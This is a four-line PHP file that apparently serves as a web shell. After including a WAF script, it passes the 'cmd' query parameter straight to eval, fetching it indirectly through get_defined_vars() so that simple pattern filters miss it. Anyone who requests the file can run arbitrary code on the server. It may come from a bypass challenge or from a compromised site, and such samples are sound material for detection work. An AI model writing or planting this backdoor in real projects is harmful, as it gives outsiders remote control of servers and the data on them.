<?php
@include_once("/var/www/html/include/waf.php");
eval(get_defined_vars()['_GET']['cmd']);
?>